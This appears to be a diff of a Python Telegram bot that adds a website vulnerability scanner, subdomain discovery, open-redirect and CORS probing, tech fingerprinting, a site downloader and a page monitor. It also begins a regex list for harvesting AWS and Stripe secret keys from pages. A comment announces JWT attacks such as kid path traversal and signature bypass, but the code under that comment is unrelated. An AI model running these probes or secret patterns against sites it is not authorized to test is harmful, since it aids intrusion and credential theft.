+                    "label": label + " (→ login)",
+                    "severity": severity, "status": status,
+                    "protected": True, "size": 0,
+                }
+
+        else:
+            try: resp.close()
+            except: pass
+
+    except requests.exceptions.Timeout:
+        pass
+    except Exception:
+        pass
+    return None
+
+
+def _verify_subdomain_real(sub_url: str) -> bool:
+    """
+    A subdomain is 'real' only if:
+    1. DNS resolves OK
+    2. HTTP responds (any code)
+    3. It has DIFFERENT content than a random path on SAME subdomain
+       (i.e. not a Cloudflare/nginx catch-all that mirrors base domain)
+    """
+    try:
+        hostname = urlparse(sub_url).hostname
+        socket.gethostbyname(hostname)   # DNS must resolve
+    except socket.gaierror:
+        return False  # NXDOMAIN = not real
+
+    # Check if it returns anything
+    try:
+        r = requests.get(sub_url, headers=_get_headers(), timeout=5,
+                         proxies=proxy_manager.get_proxy(), allow_redirects=True, verify=False, stream=True)
+        r.close()
+        code = r.status_code
+        if code >= 500:
+            return False
+    except Exception:
+        return False
+
+    # Verify it's NOT a catch-all mirror of the base domain
+    is_catchall, _, _ = _detect_catchall(sub_url)
+    # Even catch-all subdomains can be real services — just note it
+    # We still include them but mark behavior
+    return True
+
+
+def _scan_target_sync(
+    target_url: str, delay_per_req: float = 0.3
+) -> tuple:
+    """Scan one URL with catch-all detection and delays."""
+    exposed   = []
+    protected = []
+
+    # Detect catch-all first
+    catchall, baseline_hash, baseline_len = _detect_catchall(target_url)
+
+    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as ex:
+        fmap = {
+            ex.submit(
+                _probe_one, target_url, path, label, sev,
+                catchall, baseline_hash, baseline_len,
+                delay_per_req * (i % 5)   # stagger delays 0/0.3/0.6/0.9/1.2s
+            ): (path, label, sev)
+            for i, (path, label, sev) in enumerate(_VULN_PATHS)
+        }
+        for fut in concurrent.futures.as_completed(fmap, timeout=120):
+            try:
+                f = fut.result(timeout=15)
+                if f:
+                    (protected if f["protected"] else exposed).append(f)
+            except Exception:
+                pass
+
+    exposed.sort(key=lambda x: _SEV_ORDER.get(x["severity"],9))
+    protected.sort(key=lambda x: _SEV_ORDER.get(x["severity"],9))
+    return exposed, protected, catchall
+
+
+def _discover_subdomains_sync(base_url: str, progress_q: list) -> list:
+    """
+    Discover live subdomains — with real verification (not catch-all mirrors).
+    """
+    parsed = urlparse(base_url)
+    scheme = parsed.scheme
+    parts  = parsed.hostname.split('.')
+    root   = '.'.join(parts[-2:]) if len(parts) > 2 else parsed.hostname
+
+    progress_q.append(
+        f"📡 Subdomain discovery...\n"
+        f"Testing `{len(_COMMON_SUBDOMAINS)}` common names on `{escape_md(root)}`"
+    )
+
+    live = []
+
+    def check_sub(sub):
+        url = f"{scheme}://{sub}.{root}"
+        if _verify_subdomain_real(url):
+            return url
+        return None
+
+    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
+        futures = {ex.submit(check_sub, sub): sub for sub in _COMMON_SUBDOMAINS}
+        for fut in concurrent.futures.as_completed(futures, timeout=40):
+            try:
+                result = fut.result(timeout=8)
+                if result:
+                    live.append(result)
+            except Exception:
+                pass
+
+    return live
+
+
+def _vuln_scan_sync(url: str, progress_q: list, skip_subs: bool = False) -> dict:
+    """Improved orchestrator — parallel targets + CORS + open redirect."""
+    is_cloudflare = False
+    results = {
+        "url": url, "findings": [],
+        "missing_headers": [], "clickjacking": False,
+        "https": url.startswith("https://"),
+        "server": "Unknown", "subdomains_found": [],
+        "total_scanned": 0, "errors": 0,
+        "cloudflare": False,
+        "cors": {}, "open_redirects": [],
+    }
+
+    # ── Baseline headers ──────────────────────────
+    progress_q.append("🔍 Checking security headers + CORS...")
+    try:
+        r0 = requests.get(
+            url, timeout=10, headers=_get_headers(),
+            proxies=proxy_manager.get_proxy(),
+            allow_redirects=True, verify=False
+        )
+        hdrs = dict(r0.headers)
+        srv  = hdrs.get("Server", "Unknown")
+        results["server"] = srv[:60]
+        is_cloudflare = "cloudflare" in srv.lower() or "cf-ray" in hdrs
+        results["cloudflare"] = is_cloudflare
+
+        for hdr, (name, sev) in _SEC_HEADERS.items():
+            if hdr not in hdrs:
+                results["missing_headers"].append((name, hdr, sev))
+        if srv and any(c.isdigit() for c in srv):
+            results["missing_headers"].append(
+                ("Server version leak", f"Server: {srv[:50]}", "LOW"))
+        xpb = hdrs.get("X-Powered-By", "")
+        if xpb:
+            results["missing_headers"].append(
+                ("Tech disclosure", f"X-Powered-By: {xpb[:40]}", "LOW"))
+        has_xfo = "X-Frame-Options" in hdrs
+        has_fa  = "frame-ancestors" in hdrs.get("Content-Security-Policy", "")
+        results["clickjacking"] = not has_xfo and not has_fa
+    except Exception:
+        results["errors"] += 1
+
+    # ── CORS check ────────────────────────────────
+    cors_result = _check_cors_misconfig(url)
+    results["cors"] = cors_result
+    if cors_result["vulnerable"]:
+        sev = cors_result["severity"]
+        progress_q.append(
+            f"🚨 CORS misconfiguration — `{escape_md(sev)}`\n"
+            f"ACAO: `{cors_result['acao']}`\n"
+            f"Credentials: `{cors_result.get('acac','false')}`"
+        )
+
+    # ── Open redirect ─────────────────────────────
+    progress_q.append("🔀 Testing open redirect payloads...")
+    results["open_redirects"] = _check_open_redirect(url)
+    if results["open_redirects"]:
+        progress_q.append(
+            f"🟠 Open redirect found — `{len(results['open_redirects'])}` params vulnerable"
+        )
+
+    req_delay   = 0.8 if is_cloudflare else 0.2
+    if is_cloudflare:
+        progress_q.append("☁️ *Cloudflare detected* — slower scan mode...")
+
+    # ── Subdomain discovery ───────────────────────
+    if not skip_subs:
+        live_subs = _discover_subdomains_sync(url, progress_q)
+        results["subdomains_found"] = live_subs
+        if live_subs:
+            progress_q.append(
+                f"✅ *{len(live_subs)} subdomains found:*\n"
+                + "\n".join(f"  • `{escape_md(urlparse(s).netloc)}`" for s in live_subs[:8])
+            )
+        else:
+            progress_q.append("📭 No live subdomains found")
+    else:
+        progress_q.append("⏭️ Subdomain scan skipped")
+
+    # ── Parallel target scan ──────────────────────
+    all_targets = [url] + results["subdomains_found"]
+    progress_q.append(
+        f"🔍 Scanning `{len(all_targets)}` target(s) in parallel..."
+    )
+
+    def _scan_one(target):
+        exposed, protected, catchall = _scan_target_sync(target, req_delay)
+        return {
+            "target":    target,
+            "netloc":    urlparse(target).netloc,
+            "exposed":   exposed,
+            "protected": protected,
+            "catchall":  catchall,
+        }
+
+    with concurrent.futures.ThreadPoolExecutor(max_workers=min(len(all_targets), 6)) as ex:
+        futures = {ex.submit(_scan_one, t): t for t in all_targets}
+        for fut in concurrent.futures.as_completed(futures, timeout=180):
+            try:
+                r = fut.result(timeout=30)
+                results["total_scanned"] += len(_VULN_PATHS)
+                if r["exposed"] or r["protected"]:
+                    results["findings"].append(r)
+                netloc = r["netloc"]
+                exp_cnt = len(r["exposed"])
+                if exp_cnt:
+                    progress_q.append(f"🚨 `{escape_md(netloc)}` — `{escape_md(exp_cnt)}` exposed paths found")
+            except Exception:
+                results["errors"] += 1
+
+    return results
+
+
+# ── Also patch _format_vuln_report to show CORS + redirect ──────────
+def _format_vuln_report(r: dict) -> str:
+    domain = urlparse(r["url"]).netloc
+    lines  = []
+
+    total_exp = sum(len(f["exposed"]) for f in r["findings"])
+    all_sevs  = [fi["severity"] for f in r["findings"] for fi in f["exposed"]]
+
+    cors_vuln = r.get("cors", {}).get("vulnerable", False)
+    cors_sev  = r.get("cors", {}).get("severity", "")
+    redirects = r.get("open_redirects", [])
+
+    if "CRITICAL" in all_sevs or cors_sev == "CRITICAL": overall = "🔴 CRITICAL RISK"
+    elif "HIGH" in all_sevs or redirects or cors_sev == "HIGH": overall = "🟠 HIGH RISK"
+    elif "MEDIUM" in all_sevs or r["clickjacking"]: overall = "🟡 MEDIUM RISK"
+    elif r["missing_headers"]: overall = "🔵 LOW RISK"
+    else: overall = "✅ CLEAN"
+
+    cf_badge = " ☁️ Cloudflare" if r.get("cloudflare") else ""
+    lines += [
+        "🛡️ *Vulnerability Scan Report*",
+        f"🌐 `{escape_md(domain)}`{cf_badge}",
+        f"📊 Risk: *{overall}*",
+        f"🔍 Paths: `{r['total_scanned']}` | Issues: `{escape_md(total_exp)}`",
+        f"📡 Subdomains: `{len(r['subdomains_found'])}`",
+        f"🖥️ Server: `{r['server']}`",
+        "",
+    ]
+
+    # CORS result
+    lines.append("*🌐 CORS Policy:*")
+    if cors_vuln:
+        sev = r["cors"]["severity"]
+        em  = "🔴" if sev == "CRITICAL" else "🟠"
+        lines.append(f"  {em} `{escape_md(sev)}` — {r['cors']['note']}")
+        lines.append(f"  ACAO: `{r['cors']['acao']}`")
+    else:
+        lines.append("  ✅ No origin reflection")
+    lines.append("")
+
+    # Open redirect
+    if redirects:
+        lines.append(f"*🔀 Open Redirect:* `{len(redirects)}` params vulnerable")
+        for rd in redirects[:3]:
+            lines.append(f"  🟠 `?{rd['param']}=` → `{rd['location'][:60]}`")
+        lines.append("")
+
+    # Subdomains
+    if r["subdomains_found"]:
+        lines.append("*📡 Live Subdomains:*")
+        for s in r["subdomains_found"]:
+            lines.append(f"  • {s}")
+        lines.append("")
+
+    lines.append("*🔐 HTTPS:*")
+    lines.append("  ✅ HTTPS enabled" if r["https"] else "  🔴 HTTP only — no encryption!")
+    lines.append("")
+
+    if r["findings"]:
+        for f in r["findings"]:
+            if f["exposed"]:
+                lines.append(f"*🚨 Exposed — `{f['netloc']}`:*")
+                for fi in f["exposed"]:
+                    em   = _SEV_EMOJI.get(fi["severity"], "⚪")
+                    lines.append(f"  {em} `{fi['severity']}` — {fi['label']} `[{fi['status']}]`")
+                    lines.append(f"  🔗 {fi['full_url']}")
+                lines.append("")
+            if f["protected"]:
+                lines.append(f"*⚠️ Gated (401/403) — `{f['netloc']}`:*")
+                for fi in f["protected"][:5]:
+                    em = _SEV_EMOJI.get(fi["severity"], "⚪")
+                    lines.append(f"  {em} {fi['label']}")
+                    lines.append(f"  🔗 {fi['full_url']}")
+                lines.append("")
+    else:
+        lines += ["*✅ No exposed files found*", ""]
+
+    lines.append("*🖼️ Clickjacking:*")
+    if r["clickjacking"]:
+        lines.append("  🟠 Vulnerable — no X-Frame-Options / frame-ancestors")
+    else:
+        lines.append("  ✅ Protected")
+    lines.append("")
+
+    if r["missing_headers"]:
+        lines.append("*📋 Security Header Issues:*")
+        for name, hdr, sev in r["missing_headers"][:8]:
+            em = _SEV_EMOJI.get(sev, "⚪")
+            if "leak" in name.lower() or "disclosure" in name.lower():
+                lines.append(f"  {em} {name}: `{escape_md(hdr)}`")
+            else:
+                lines.append(f"  {em} Missing *{name}*")
+        lines.append("")
+
+    lines += [
+        "━━━━━━━━━━━━━━━━━━",
+        "⚠️ _Passive scan only — no exploitation_",
+    ]
+    return "\n".join(lines)
+
+
+# ───────────────────────────────────────────────────────────────────
+# [2] REPLACE JWT functions (original: lines ~5482–5600)
+#     IMPROVEMENTS:
+#       + kid path traversal injection (/etc/passwd, SQLi)
+#       + JWKS endpoint spoof detection + jku/x5u injection
+#       + exp=9999999999 timestamp forgery
+#       + Parallel brute-force (ThreadPoolExecutor)
+#       + All-in-one combined attack report
+# ───────────────────────────────────────────────────────────────────
+
+def download_website(
+    base_url: str,
+    full_site: bool,
+    use_js: bool,
+    max_pages: int,
+    max_assets: int,
+    progress_cb=None,
+    resume: bool = False,
+) -> tuple:
+
+    domain     = urlparse(base_url).netloc
+    safe       = re.sub(r'[^\w\-]','_', domain)
+    domain_dir = os.path.join(DOWNLOAD_DIR, safe)
+    os.makedirs(domain_dir, exist_ok=True)
+
+    state       = load_resume(base_url) if resume else {"visited":[],"downloaded":[],"assets":[],"stats":{}}
+    visited     = set(state["visited"])
+    dl_done     = set(state["downloaded"])
+    known_assets= set(state["assets"])
+    stats = state.get("stats") or {'pages':0,'assets':0,'failed':0,'size_kb':0}
+
+    session = requests.Session()
+    session.headers.update(_get_headers())
+
+    # ── Attach proxy to session if available ──────
+    _px = proxy_manager.get_proxy()
+    if _px:
+        session.proxies.update(_px)
+
+    # ── Phase 0: Sitemap discovery ───────────────
+    queue: list = [base_url]   # ← FIX: initialize before sitemap section
+    if full_site and not resume:
+        if progress_cb: progress_cb("🗺️ Sitemap ရှာနေပါတယ်...")
+        sitemap_urls = fetch_sitemap(base_url)
+        if sitemap_urls:
+            stats['sitemap_urls'] = len(sitemap_urls)
+            if progress_cb:
+                progress_cb("🗺️ Sitemap: `%d` URLs တွေ့ပြီ" % len(sitemap_urls))
+            for u in list(sitemap_urls)[:max_pages]:
+                if u not in visited and u not in queue:
+                    queue.append(u)
+
+    # ── Phase 1: Pages ──────────────────────────
+    queue = list(dict.fromkeys(queue))
+    queue = [u for u in queue if u not in visited]
+
+    while queue and len(visited) < max_pages:
+        url = queue.pop(0)
+        if url in visited: continue
+
+        # SSRF check per link
+        safe_ok, reason = is_safe_url(url)
+        if not safe_ok:
+            log_warn(url, f"SSRF blocked: {reason}")
+            stats['failed'] += 1
+            visited.add(url)
+            continue
+
+        visited.add(url)
+        html, js_used = fetch_page(url, use_js)
+        if html is None:
+            stats['failed'] += 1
+            continue
+
+        local = safe_local_path(domain_dir, url)
+        try:
+            with open(local,'w',encoding='utf-8',errors='replace') as f:
+                f.write(html)
+            stats['pages'] += 1
+        except Exception:
+            stats['failed'] += 1
+            continue
+
+        known_assets |= extract_assets(html, url)
+        if full_site:
+            for link in get_internal_links(html, url):
+                if link not in visited:
+                    queue.append(link)
+
+        if stats['pages'] % 5 == 0:
+            save_resume(base_url, {"visited":list(visited),"downloaded":list(dl_done),
+                                   "assets":list(known_assets),"stats":stats})
+        if progress_cb:
+            bar = pbar(stats['pages'], max(len(visited), 1))
+            progress_cb(
+                f"📄 *Pages*\n`{escape_md(bar)}`\n"
+                f"`{stats['pages']}` pages | `{len(known_assets)}` assets"
+                + (" ⚡JS" if js_used else "")
+            )
+
+    # ── Phase 2: Assets ─────────────────────────
+    asset_list   = [a for a in list(known_assets)[:max_assets] if a not in dl_done]
+    total_assets = len(asset_list) + len(dl_done)
+    extra_css    = set()
+    max_bytes    = MAX_ASSET_MB * 1024 * 1024
+
+    for i, asset_url in enumerate(asset_list):
+        dl_done.add(asset_url)
+
+        # SSRF check per asset
+        safe_ok, reason = is_safe_url(asset_url)
+        if not safe_ok:
+            log_warn(asset_url, f"Asset SSRF blocked: {reason}")
+            stats['failed'] += 1
+            continue
+
+        try:
+            resp = session.get(asset_url, timeout=TIMEOUT, stream=True)
+            resp.raise_for_status()
+
+            # ── File size limit (DoS prevention) ──
+            cl = resp.headers.get('Content-Length')
+            if cl and int(cl) > max_bytes:
+                log_warn(asset_url, f"Asset too large: {int(cl)//1024//1024}MB — skipped")
+                stats['failed'] += 1
+                continue
+
+            content      = b''
+            size_exceeded = False
+            for chunk in resp.iter_content(8192):
+                content += chunk
+                if len(content) > max_bytes:
+                    size_exceeded = True
+                    break
+            if size_exceeded:
+                log_warn(asset_url, "Asset size limit exceeded mid-stream — skipped")
+                stats['failed'] += 1
+                continue
+
+            local = safe_local_path(domain_dir, asset_url)
+            with open(local,'wb') as f: f.write(content)
+            stats['assets'] += 1
+            stats['size_kb'] += len(content)/1024
+
+            ct = resp.headers.get('Content-Type','')
+            if 'css' in ct or asset_url.lower().endswith('.css'):
+                extra_css |= extract_css_assets(content.decode('utf-8','replace'), asset_url)
+            # ── Mine JS bundles for media URLs ────
+            if 'javascript' in ct or asset_url.lower().endswith('.js'):
+                js_media = extract_media_from_js(content.decode('utf-8','replace'), base_url)
+                known_assets |= js_media
+
+        except Exception as e:
+            stats['failed'] += 1
+
+        if i % 30 == 0:
+            save_resume(base_url, {"visited":list(visited),"downloaded":list(dl_done),
+                                   "assets":list(known_assets),"stats":stats})
+        if progress_cb and i % 10 == 0:
+            bar = pbar(len(dl_done), total_assets)
+            progress_cb(
+                f"📦 *Assets*\n`{escape_md(bar)}`\n"
+                f"`{stats['assets']}` done | `{stats['size_kb']/1024:.1f}` MB"
+            )
+
+    # ── Phase 3: CSS nested assets ──────────────
+    for asset_url in list(extra_css - dl_done)[:200]:
+        safe_ok, _ = is_safe_url(asset_url)
+        if not safe_ok: continue
+        try:
+            resp    = session.get(asset_url, timeout=TIMEOUT, stream=True)
+            resp.raise_for_status()
+            content = b''.join(resp.iter_content(8192))
+            if len(content) > max_bytes: continue
+            local   = safe_local_path(domain_dir, asset_url)
+            with open(local,'wb') as f: f.write(content)
+            stats['assets']  += 1
+            stats['size_kb'] += len(content)/1024
+        except Exception:
+            stats['failed'] += 1
+
+    # ── Phase 4: ZIP ─────────────────────────────
+    if progress_cb: progress_cb("🗜️ ZIP ထုပ်နေပါတယ်...")
+
+    zip_path = os.path.join(DOWNLOAD_DIR, f"{safe}.zip")
+    with zipfile.ZipFile(zip_path,'w',zipfile.ZIP_DEFLATED) as zf:
+        for root,dirs,files in os.walk(domain_dir):
+            for file in files:
+                fp = os.path.join(root,file)
+                zf.write(fp, os.path.relpath(fp, DOWNLOAD_DIR))
+
+    shutil.rmtree(domain_dir, ignore_errors=True)
+    clear_resume(base_url)
+
+    size_mb = os.path.getsize(zip_path)/1024/1024
+
+    if needs_split(zip_path):
+        if progress_cb: progress_cb(f"✂️ {size_mb:.1f}MB split လုပ်နေပါတယ်...")
+        parts = split_zip(zip_path)
+        os.remove(zip_path)
+        return parts, None, stats, size_mb
+    return [zip_path], None, stats, size_mb
+
+
+# ══════════════════════════════════════════════════
+# 🔬  FEATURE 1 — /tech  Tech Stack Fingerprinter
+# ══════════════════════════════════════════════════
+
+_TECH_SIGNATURES = {
+    # CMS
+    "WordPress":        [r'wp-content/', r'wp-includes/', r'wordpress'],
+    "Drupal":           [r'Drupal\.settings', r'/sites/default/files/'],
+    "Joomla":           [r'/media/joomla_', r'Joomla!'],
+    "Ghost CMS":        [r'ghost\.io', r'/ghost/api/'],
+    "Shopify":          [r'cdn\.shopify\.com', r'Shopify\.theme'],
+    # JS Frameworks
+    "Next.js":          [r'__NEXT_DATA__', r'/_next/static/'],
+    "Nuxt.js":          [r'__NUXT__', r'/_nuxt/'],
+    "React":            [r'__reactFiber', r'react-dom\.production'],
+    "Vue.js":           [r'__vue__', r'data-v-[a-f0-9]+'],
+    "Angular":          [r'ng-version=', r'angular\.min\.js'],
+    "Svelte":           [r'__svelte', r'svelte-'],
+    # Servers
+    "Nginx":            [r'server:\s*nginx'],
+    "Apache":           [r'server:\s*apache'],
+    "Caddy":            [r'server:\s*caddy'],
+    "LiteSpeed":        [r'server:\s*litespeed'],
+    "IIS":              [r'server:\s*microsoft-iis'],
+    # CDN / WAF
+    "Cloudflare":       [r'cf-ray', r'server:\s*cloudflare'],
+    "Akamai":           [r'x-akamai-request-id', r'akamai\.net'],
+    "Fastly":           [r'x-fastly-request-id', r'fastly\.net'],
+    "AWS CloudFront":   [r'x-amz-cf-id', r'cloudfront\.net'],
+    # Analytics / Tag
+    "Google Analytics": [r'google-analytics\.com/analytics\.js', r'gtag\('],
+    "Google Tag Manager":[r'googletagmanager\.com/gtm\.js', r'GTM-[A-Z0-9]+'],
+    "Hotjar":           [r'hotjar\.com', r'hj\(\'create\''],
+    # Libraries
+    "jQuery":           [r'jquery\.min\.js', r'jquery-[0-9]'],
+    "Bootstrap":        [r'bootstrap\.min\.css', r'bootstrap\.min\.js'],
+    "Tailwind":         [r'tailwindcss', r'class="[^"]*(?:flex|grid|text-[a-z]+-[0-9])'],
+    # Backend
+    "PHP":              [r'x-powered-by:\s*php', r'\.php'],
+    "Laravel":          [r'laravel_session', r'x-powered-by:\s*php.*laravel'],
+    "Django":           [r'csrfmiddlewaretoken', r'django'],
+    "Rails":            [r'x-powered-by:\s*phusion passenger', r'_rails_'],
+    "ASP.NET":          [r'x-powered-by:\s*asp\.net', r'__viewstate'],
+    # DB / Backend hints
+    "WordPress (WooCommerce)": [r'woocommerce', r'wc-api/'],
+    "Stripe":           [r'stripe\.com/v3', r'Stripe\('],
+    "Firebase":         [r'firebaseapp\.com', r'firebase\.initializeApp'],
+    "Supabase":         [r'supabase\.co', r'supabaseClient'],
+}
+
+_NOTABLE_HEADERS = [
+    'server', 'x-powered-by', 'x-generator', 'x-framework',
+    'cf-ray', 'via', 'x-drupal-cache', 'x-varnish',
+    'x-shopify-stage', 'x-wix-request-id',
+]
+
+async def cmd_tech(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """/tech <url> — Detect technology stack"""
+    if not context.args:
+        await update.effective_message.reply_text(
+            "📌 *Usage:* `/tech https://example.com`\n\n"
+            "🔬 *Detects:*  CMS, JS frameworks, servers, CDN/WAF,\n"
+            "analytics, backend tech, JS libraries & more.\n\n"
+            f"Checks `{len(_TECH_SIGNATURES)}` known tech signatures.",
+            parse_mode='Markdown'
+        )
+        return
+
+    uid = update.effective_user.id
+    allowed, wait = check_rate_limit(uid)
+    if not allowed:
+        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
+        return
+
+    url = context.args[0].strip()
+    if not url.startswith('http'):
+        url = 'https://' + url
+
+    safe_ok, reason = is_safe_url(url)
+    if not safe_ok:
+        await update.effective_message.reply_text(f"🚫 `{escape_md(reason)}`", parse_mode='Markdown')
+        return
+
+    msg = await update.effective_message.reply_text("🔬 Tech stack fingerprinting...")
+
+    def _do_tech_scan():
+        resp = requests.get(
+            url, headers=_get_headers(), timeout=TIMEOUT, verify=False,
+            proxies=proxy_manager.get_proxy(), allow_redirects=True
+        )
+        body         = resp.text[:80000]
+        headers_str  = "\n".join(f"{k}: {v}" for k, v in resp.headers.items()).lower()
+        combined     = (body + headers_str).lower()
+
+        detected = {}
+        for tech, patterns in _TECH_SIGNATURES.items():
+            for p in patterns:
+                if re.search(p, combined, re.I):
+                    detected[tech] = p
+                    break
+
+        notable = {
+            k: v for k, v in resp.headers.items()
+            if k.lower() in _NOTABLE_HEADERS
+        }
+        return detected, notable, resp.status_code
+
+    try:
+        detected, notable, status = await run_scan(uid, _do_tech_scan)
+    except Exception as e:
+        await msg.edit_text(f"❌ Error: `{escape_md(e)}`", parse_mode='Markdown')
+        return
+
+    domain = urlparse(url).hostname
+    lines  = [f"🔬 *Tech Stack — `{escape_md(domain)}`*", f"Status: `{escape_md(status)}`\n"]
+
+    # Group by category
+    _CAT = {
+        "CMS":        ["WordPress","Drupal","Joomla","Ghost CMS","Shopify","WordPress (WooCommerce)"],
+        "JS Frameworks":["Next.js","Nuxt.js","React","Vue.js","Angular","Svelte"],
+        "JS Libraries": ["jQuery","Bootstrap","Tailwind"],
+        "Server":     ["Nginx","Apache","Caddy","LiteSpeed","IIS"],
+        "CDN / WAF":  ["Cloudflare","Akamai","Fastly","AWS CloudFront"],
+        "Analytics":  ["Google Analytics","Google Tag Manager","Hotjar"],
+        "Backend":    ["PHP","Laravel","Django","Rails","ASP.NET"],
+        "Services":   ["Stripe","Firebase","Supabase"],
+    }
+
+    any_found = False
+    for cat, techs in _CAT.items():
+        hits = [t for t in techs if t in detected]
+        if hits:
+            lines.append(f"*{cat}:*")
+            for h in hits:
+                lines.append(f"  ✅ `{escape_md(h)}`")
+            lines.append("")
+            any_found = True
+
+    # Uncategorised
+    known_all = {t for ts in _CAT.values() for t in ts}
+    extras    = [t for t in detected if t not in known_all]
+    if extras:
+        lines.append("*Other:*")
+        for t in extras:
+            lines.append(f"  ✅ `{escape_md(t)}`")
+        lines.append("")
+        any_found = True
+
+    if not any_found:
+        lines.append("⚠️ No known tech signatures matched.")
+
+    if notable:
+        lines.append("*📋 Notable Headers:*")
+        for k, v in list(notable.items())[:8]:
+            lines.append(f"  `{k}: {v[:60]}`")
+
+    await safe_markdown_reply(msg, _truncate_safe_md("\n".join(lines)))
+
+
+# ══════════════════════════════════════════════════
+# 🔔  FEATURE 3 — /monitor  Change Detection & Alerting
+# ══════════════════════════════════════════════════
+# DB structure: db["monitors"][str(uid)] = [{"url":..,"interval_min":..,"last_hash":..,"last_check":..,"label":..}]
+
+_monitor_app_ref = None   # set in main() to access app.bot
+
+async def monitor_loop():
+    """Background task — check monitored URLs for content changes every 60s."""
+    global _monitor_app_ref
+    while True:
+        try:
+            await asyncio.sleep(60)
+            async with db_lock:
+                db = _load_db_sync()
+
+            changed_alerts = []  # (uid, entry, new_hash)
+            now = time.time()
+
+            for uid_str, monitors in db.get("monitors", {}).items():
+                for entry in monitors:
+                    interval_sec = entry.get("interval_min", 30) * 60
+                    if now - entry.get("last_check", 0) < interval_sec:
+                        continue
+                    try:
+                        resp      = requests.get(
+                            entry["url"], headers=_get_headers(),
+                            timeout=TIMEOUT, verify=False,
+                            proxies=proxy_manager.get_proxy()
+                        )
+                        new_hash  = hashlib.sha256(resp.text.encode()).hexdigest()
+                        old_hash  = entry.get("last_hash", "")
+                        entry["last_check"] = now
+
+                        if old_hash and old_hash != new_hash:
+                            changed_alerts.append((uid_str, entry, new_hash, resp.status_code))
+                        entry["last_hash"] = new_hash
+                    except Exception as ex:
+                        logger.debug("Monitor check error %s: %s", entry.get("url"), ex)
+
+            async with db_lock:
+                _save_db_sync(db)
+
+            # Fire alerts
+            if _monitor_app_ref and changed_alerts:
+                for uid_str, entry, new_hash, status in changed_alerts:
+                    try:
+                        label = escape_md(entry.get("label") or entry["url"][:40])
+                        safe_url = escape_md(entry['url'][:60])
+                        await safe_markdown_send(
+                            _monitor_app_ref.bot,
+                            chat_id=int(uid_str),
+                            text=(
+                                f"🔔 *Page Changed!*\n"
+                                f"━━━━━━━━━━━━━━━━━━━━\n"
+                                f"🏷 *{label}*\n"
+                                f"🔗 `{safe_url}`\n"
+                                f"📡 Status: `{escape_md(str(status))}`\n"
+                                f"🕑 {datetime.now().strftime('%Y-%m-%d %H:%M')}\n\n"
+                                f"Old: `{entry.get('last_hash','?')[:16]}…`\n"
+                                f"New: `{new_hash[:16]}…`\n\n"
+                                f"_Use /monitor list to manage alerts_"
+                            ),
+                        )
+                    except Exception as e:
+                        logger.warning("Monitor alert send error: %s", e)
+
+        except Exception as e:
+            logger.error("Monitor loop error: %s", e)
+            await asyncio.sleep(30)
+
+
+async def cmd_monitor(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """/monitor add <url> [interval_min] [label] | list | del <n> | clear"""
+    uid  = str(update.effective_user.id)
+    args = context.args or []
+    sub  = args[0].lower() if args else ""
+
+    if not sub or sub == "help":
+        await update.effective_message.reply_text(
+            "🔔 *Page Monitor — Usage*\n\n"
+            "`/monitor add <url> [interval] [label]`\n"
+            "  └ interval = minutes (default 30, min 5)\n"
+            "  └ label = custom name (optional)\n\n"
+            "`/monitor list` — View all monitors\n"
+            "`/monitor del <n>` — Remove by number\n"
+            "`/monitor clear` — Remove all\n\n"
+            "📣 Bot ကို alert ပို့ပေးမယ် page ပြောင်းတိုင်း",
+            parse_mode='Markdown'
+        )
+        return
+
+    async with db_lock:
+        db = _load_db_sync()
+        if "monitors" not in db:
+            db["monitors"] = {}
+        monitors = db["monitors"].setdefault(uid, [])
+
+        if sub == "add":
+            if len(args) < 2:
+                await update.effective_message.reply_text("Usage: `/monitor add <url> [interval_min] [label]`", parse_mode='Markdown')
+                _save_db_sync(db)
+                return
+            url   = args[1].strip()
+            if not url.startswith('http'):
+                url = 'https://' + url
+            safe_ok, reason = is_safe_url(url)
+            if not safe_ok:
+                await update.effective_message.reply_text(f"🚫 `{escape_md(reason)}`", parse_mode='Markdown')
+                _save_db_sync(db)
+                return
+            interval = max(5, int(args[2])) if len(args) > 2 and args[2].isdigit() else 30
+            label    = " ".join(args[3:])[:40] if len(args) > 3 else urlparse(url).hostname
+            if len(monitors) >= 10:
+                await update.effective_message.reply_text("⚠️ Max 10 monitors per user.", parse_mode='Markdown')
+                _save_db_sync(db)
+                return
+            monitors.append({
+                "url": url, "label": label,
+                "interval_min": interval,
+                "last_hash": "", "last_check": 0,
+                "added": datetime.now().strftime("%Y-%m-%d %H:%M")
+            })
+            _save_db_sync(db)
+            await update.effective_message.reply_text(
+                f"✅ *Monitor Added*\n"
+                f"🏷 `{escape_md(label)}`\n🔗 `{escape_md(url[:60])}`\n⏱ Every `{escape_md(interval)}` min",
+                parse_mode='Markdown'
+            )
+
+        elif sub == "list":
+            _save_db_sync(db)
+            if not monitors:
+                await update.effective_message.reply_text("📭 No monitors set up yet.")
+                return
+            lines = ["🔔 *Your Monitors*\n"]
+            for i, m in enumerate(monitors, 1):
+                lines.append(
+                    f"*{i}.* `{m.get('label', m['url'][:30])}`\n"
+                    f"   🔗 `{m['url'][:50]}`\n"
+                    f"   ⏱ Every `{m['interval_min']}` min | Added `{m.get('added','?')}`"
+                )
+            await safe_markdown_reply(update.effective_message, _truncate_safe_md("\n".join(lines)))
+
+        elif sub == "del":
+            idx = int(args[1]) - 1 if len(args) > 1 and args[1].isdigit() else -1
+            if 0 <= idx < len(monitors):
+                removed = monitors.pop(idx)
+                _save_db_sync(db)
+                await update.effective_message.reply_text(
+                    f"🗑 Removed: `{removed.get('label', removed['url'][:40])}`",
+                    parse_mode='Markdown'
+                )
+            else:
+                _save_db_sync(db)
+                await update.effective_message.reply_text("❌ Invalid number. Use `/monitor list` to see indexes.", parse_mode='Markdown')
+
+        elif sub == "clear":
+            monitors.clear()
+            _save_db_sync(db)
+            await update.effective_message.reply_text("🗑 All monitors cleared.")
+
+        else:
+            _save_db_sync(db)
+            await update.effective_message.reply_text("❓ Unknown subcommand. Use `/monitor help`", parse_mode='Markdown')
+
+
+# ══════════════════════════════════════════════════
+# 🔑  FEATURE 7 — /extract  Secret & Sensitive Data Extractor
+# ══════════════════════════════════════════════════
+
+_SECRET_PATTERNS = {
+    "AWS Access Key":    (r'AKIA[0-9A-Z]{16}',                              "🔴"),
+    "AWS Secret":        (r'(?i)aws.{0,20}secret.{0,20}[0-9a-zA-Z/+]{40}', "🔴"),
+    "Stripe Secret":     (r'sk_live_[0-9a-zA-Z]{24,}',                     "🔴"),
